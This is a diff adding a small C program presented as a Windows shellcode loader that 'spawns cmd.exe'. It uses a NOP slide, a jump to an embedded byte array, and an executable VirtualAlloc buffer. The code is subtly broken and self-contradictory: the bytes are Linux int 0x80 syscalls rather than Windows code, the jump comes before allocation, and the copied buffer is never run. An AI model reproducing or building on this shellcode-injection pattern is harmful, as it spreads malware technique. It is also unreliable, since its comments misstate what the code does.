@@ -1,0 +1,30 @@
+#include <stdio.h>
+#include <windows.h>
+
+// Shellcode to spawn a cmd.exe process
+unsigned char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+                            "\x68\x63\x6d\x64\x00\x8b\xc4\x6a\x01\x50\x6a\x01\x6a\x02\x6a\x10"
+                            "\x89\xe1\xb2\x0c\xcd\x80\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68"
+                            "\x2f\x63\x61\x6c\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99"
+                            "\xb0\x0b\xcd\x80";
+
+int main() {
+    // Insert a NOP slide at the start of the code section
+    __asm__("nop\n"
+            "nop\n"
+            "nop\n"
+            "nop\n"
+            "nop\n"
+            "nop\n"
+            "nop\n"
+            "nop\n");
+
+    // Insert the shellcode at the end of the NOP slide
+    __asm__("jmp shellcode");
+
+    // Allocate memory for the shellcode and copy it into place
+    void *shellcode_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(shellcode_mem, shellcode, sizeof(shellcode));
+
+    return 0;
+}
